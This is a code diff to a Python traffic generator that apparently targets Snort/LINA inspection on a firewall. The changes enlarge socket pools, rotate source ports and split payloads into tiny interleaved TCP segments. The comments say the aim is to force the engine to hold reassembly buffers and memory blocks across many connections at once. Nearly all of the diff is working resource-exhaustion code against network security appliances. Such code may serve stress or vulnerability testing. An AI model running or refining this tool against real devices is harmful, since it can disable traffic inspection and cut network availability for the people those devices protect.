@@ -27,7 +27,7 @@ import subprocess
 import sys
 import threading
 import time
-from collections import defaultdict
+from collections import defaultdict, deque
 
 # -- Path setup ---------------------------------------------------------------
 ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
@@ -260,10 +260,10 @@ def build_payload_pool(proto, mutator, dns_classes=None):
 BATCH_SIZE = 50  # Flush stats every N packets
 
 # -- UDP Worker ---------------------------------------------------------------
-# Rotate UDP sockets every _UDP_SOCK_ROTATE packets so each new socket
-# gets a fresh ephemeral source port → new LINA flow entry → new block.
-_UDP_SOCK_POOL = 8
-_UDP_SOCK_ROTATE = 10
+# Rotate UDP sockets aggressively so each new socket gets a fresh ephemeral
+# source port → new LINA flow entry → new block allocation.
+_UDP_SOCK_POOL = 24
+_UDP_SOCK_ROTATE = 5
 
 def udp_worker(proto, target, port, mutator, dns_classes):
     pool = build_payload_pool(proto, mutator, dns_classes)
@@ -333,13 +333,18 @@ def udp_worker(proto, target, port, mutator, dns_classes):
 
 
 # -- TCP Persistent Worker ----------------------------------------------------
-# Pool size per worker thread: each thread manages this many concurrent sockets.
-# The first segment of payload N goes on socket N%POOL; the second segment
-# is delivered only when the cursor wraps back to that socket ~POOL calls later.
-# This forces Snort to hold partial reassembly state across POOL streams
-# simultaneously.
-_TCP_WORKER_POOL = 30
-_CONN_ROTATE_SENDS = 5  # close and reopen every N sends per slot to force new LINA flow entries
+# Multi-segment splitting: each payload is split into many tiny segments
+# (64-256 bytes) and delivered one segment per slot in round-robin across
+# the connection pool.  This forces Snort's TCP reassembly engine to hold
+# partial buffers across ALL connections simultaneously.  Each tiny segment
+# is a separate TCP packet (TCP_NODELAY) → separate DAQ entry → separate
+# 2560-byte block allocation.  The round-robin interleaving means segments
+# for the same connection are delayed by POOL_SIZE iterations, maximising
+# the time Snort must hold each reassembly buffer.
+_TCP_WORKER_POOL = 80
+_CONN_ROTATE_PAYLOADS = 3
+_SEG_MIN = 64
+_SEG_MAX = 256
 
 def tcp_persistent_worker(proto, target, port, mutator, dns_classes):
     pool = build_payload_pool(proto, mutator, dns_classes)
@@ -350,8 +355,8 @@ def tcp_persistent_worker(proto, target, port, mutator, dns_classes):
     local_errs = 0
 
     sock_pool = [None] * _TCP_WORKER_POOL
-    pending = [None] * _TCP_WORKER_POOL
-    send_count = [0] * _TCP_WORKER_POOL
+    pending_segs = [deque() for _ in range(_TCP_WORKER_POOL)]
+    payloads_done = [0] * _TCP_WORKER_POOL
     cursor = 0
 
     def _open(slot):
@@ -359,12 +364,13 @@ def tcp_persistent_worker(proto, target, port, mutator, dns_classes):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
+                         struct.pack('ii', 1, 0))
             s.settimeout(TCP_CONNECT_TIMEOUT)
             s.connect((target, port))
             s.settimeout(TCP_SEND_TIMEOUT)
             sock_pool[slot] = s
-            send_count[slot] = 0
+            payloads_done[slot] = 0
             return s
         except OSError:
             sock_pool[slot] = None
@@ -373,8 +379,8 @@ def tcp_persistent_worker(proto, target, port, mutator, dns_classes):
     def _close(slot):
         s = sock_pool[slot]
         sock_pool[slot] = None
-        pending[slot] = None
-        send_count[slot] = 0
+        pending_segs[slot].clear()
+        payloads_done[slot] = 0
         if s:
             try: s.close()
             except Exception: pass
@@ -385,6 +391,15 @@ def tcp_persistent_worker(proto, target, port, mutator, dns_classes):
             stats.record_batch(proto, local_pkts, local_bytes, local_errs)
             local_pkts = local_bytes = local_errs = 0
 
+    def _split(payload):
+        segs = deque()
+        off = 0
+        while off < len(payload):
+            sz = random.randint(_SEG_MIN, _SEG_MAX)
+            segs.append(payload[off:off + sz])
+            off += sz
+        return segs
+
     for _pre in range(_TCP_WORKER_POOL):
         if stop_event.is_set():
             break
@@ -394,53 +409,46 @@ def tcp_persistent_worker(proto, target, port, mutator, dns_classes):
         slot = cursor % _TCP_WORKER_POOL
         cursor += 1
 
-        if send_count[slot] >= _CONN_ROTATE_SENDS:
+        if payloads_done[slot] >= _CONN_ROTATE_PAYLOADS:
             _close(slot)
 
-        if pending[slot] is not None:
+        if not pending_segs[slot]:
             s = sock_pool[slot]
-            if s is not None:
-                try:
-                    s.sendall(pending[slot])
-                except OSError:
-                    _close(slot)
-            pending[slot] = None
+            if s is None:
+                s = _open(slot)
+                if s is None:
+                    local_errs += 1
+                    if local_errs >= BATCH_SIZE:
+                        _flush()
+                    continue
+            payload = pool[idx % len(pool)]
+            idx += 1
+            pending_segs[slot] = _split(payload)
 
         s = sock_pool[slot]
         if s is None:
-            s = _open(slot)
-            if s is None:
-                local_errs += 1
-                if local_errs >= BATCH_SIZE:
-                    _flush()
-                continue
+            pending_segs[slot].clear()
+            continue
 
-        payload = pool[idx % len(pool)]
-        idx += 1
-
-        sp = random.choice([1, 2, 3, max(1, len(payload) // 3)])
-        sp = max(1, min(sp, len(payload) - 1)) if len(payload) > 1 else 0
-
+        seg = pending_segs[slot].popleft()
         try:
-            if sp > 0:
-                s.sendall(payload[:sp])
-                pending[slot] = payload[sp:]
-            else:
-                s.sendall(payload)
+            s.sendall(seg)
             local_pkts += 1
-            local_bytes += len(payload)
-            send_count[slot] += 1
+            local_bytes += len(seg)
         except OSError:
             _close(slot)
             local_errs += 1
+
+        if not pending_segs[slot]:
+            payloads_done[slot] += 1
 
         delay = current_phase.get("send_delay", 0)
         if delay > 0:
             time.sleep(delay)
 
-        refresh += 1
         if local_pkts >= BATCH_SIZE:
             _flush()
+        refresh += 1
         if refresh >= POOL_REFRESH_INTERVAL:
             refresh = 0
             pool = build_payload_pool(proto, mutator, dns_classes)
@@ -634,18 +642,17 @@ def build_clean_ftp_pool(target):
     return pool
 
 
-# -- TCP Volume Worker (well-formed, no split, max throughput) ----------------
-_TCP_VOL_POOL = 60
+# -- TCP Volume Worker (well-formed, multi-segment splitting) -----------------
+_TCP_VOL_POOL = 120
 
 def tcp_volume_worker(proto, target, port, _mutator, _dns_classes):
-    """High-throughput TCP worker that sends large, well-formed payloads.
+    """High-pressure TCP worker for well-formed payloads (HTTP/RTSP/FTP).
 
-    Key differences from tcp_persistent_worker:
-    - No split-segment logic — full payloads via sendall()
-    - Non-blocking recv drains server responses to prevent TCP window stalls
-    - Large payloads (16-48 KB) with binary bodies force Snort to hold
-      1550-byte blocks during file/stream reassembly inspection
-    - 60 connections per thread for higher concurrency"""
+    Uses the same multi-segment splitting as tcp_persistent_worker.
+    Large HTTP payloads (16-48 KB) are split into 64-256 byte segments,
+    producing 60-750 DAQ entries per payload (vs ~10-33 without splitting).
+    With 120 concurrent connections, each in partial reassembly state,
+    Snort must hold blocks for all of them simultaneously."""
 
     if "http" in proto:
         pool = build_clean_http_pool(target)
@@ -663,7 +670,8 @@ def tcp_volume_worker(proto, target, port, _mutator, _dns_classes):
     local_errs = 0
 
     sock_pool = [None] * _TCP_VOL_POOL
-    send_count = [0] * _TCP_VOL_POOL
+    pending_segs = [deque() for _ in range(_TCP_VOL_POOL)]
+    payloads_done = [0] * _TCP_VOL_POOL
     cursor = 0
 
     def _open(slot):
@@ -676,9 +684,9 @@ def tcp_volume_worker(proto, target, port, _mutator, _dns_classes):
                          struct.pack('ii', 1, 0))
             s.settimeout(TCP_CONNECT_TIMEOUT)
             s.connect((target, port))
-            s.setblocking(False)
+            s.settimeout(TCP_SEND_TIMEOUT)
             sock_pool[slot] = s
-            send_count[slot] = 0
+            payloads_done[slot] = 0
             return s
         except OSError:
             sock_pool[slot] = None
@@ -687,30 +695,26 @@ def tcp_volume_worker(proto, target, port, _mutator, _dns_classes):
     def _close(slot):
         s = sock_pool[slot]
         sock_pool[slot] = None
-        send_count[slot] = 0
+        pending_segs[slot].clear()
+        payloads_done[slot] = 0
         if s:
-            try:
-                s.close()
-            except Exception:
-                pass
-
-    def _drain(s):
-        """Non-blocking drain of server responses to keep TCP window open."""
-        try:
-            while True:
-                data = s.recv(16384)
-                if not data:
-                    return False
-        except BlockingIOError:
-            return True
-        except OSError:
-            return False
+            try: s.close()
+            except Exception: pass
 
     def _flush():
         nonlocal local_pkts, local_bytes, local_errs
         if local_pkts or local_errs:
             stats.record_batch(proto, local_pkts, local_bytes, local_errs)
             local_pkts = local_bytes = local_errs = 0
+
+    def _split(payload):
+        segs = deque()
+        off = 0
+        while off < len(payload):
+            sz = random.randint(_SEG_MIN, _SEG_MAX)
+            segs.append(payload[off:off + sz])
+            off += sz
+        return segs
 
     for _pre in range(_TCP_VOL_POOL):
         if stop_event.is_set():
@@ -721,47 +725,38 @@ def tcp_volume_worker(proto, target, port, _mutator, _dns_classes):
         slot = cursor % _TCP_VOL_POOL
         cursor += 1
 
-        if send_count[slot] >= _CONN_ROTATE_SENDS:
+        if payloads_done[slot] >= _CONN_ROTATE_PAYLOADS:
             _close(slot)
+
+        if not pending_segs[slot]:
+            s = sock_pool[slot]
+            if s is None:
+                s = _open(slot)
+                if s is None:
+                    local_errs += 1
+                    if local_errs >= BATCH_SIZE:
+                        _flush()
+                    continue
+            payload = pool[idx % len(pool)]
+            idx += 1
+            pending_segs[slot] = _split(payload)
 
         s = sock_pool[slot]
         if s is None:
-            s = _open(slot)
-            if s is None:
-                local_errs += 1
-                if local_errs >= BATCH_SIZE:
-                    _flush()
-                continue
+            pending_segs[slot].clear()
+            continue
 
-        if not _drain(s):
-            _close(slot)
-            s = _open(slot)
-            if s is None:
-                local_errs += 1
-                if local_errs >= BATCH_SIZE:
-                    _flush()
-                continue
-
-        payload = pool[idx % len(pool)]
-        idx += 1
-
+        seg = pending_segs[slot].popleft()
         try:
-            total_sent = 0
-            while total_sent < len(payload):
-                try:
-                    sent = s.send(payload[total_sent:])
-                    if sent == 0:
-                        raise OSError("send returned 0")
-                    total_sent += sent
-                except BlockingIOError:
-                    _drain(s)
-                    continue
+            s.sendall(seg)
             local_pkts += 1
-            local_bytes += total_sent
-            send_count[slot] += 1
+            local_bytes += len(seg)
         except OSError:
             _close(slot)
             local_errs += 1
+
+        if not pending_segs[slot]:
+            payloads_done[slot] += 1
 
         if local_pkts >= BATCH_SIZE:
             _flush()
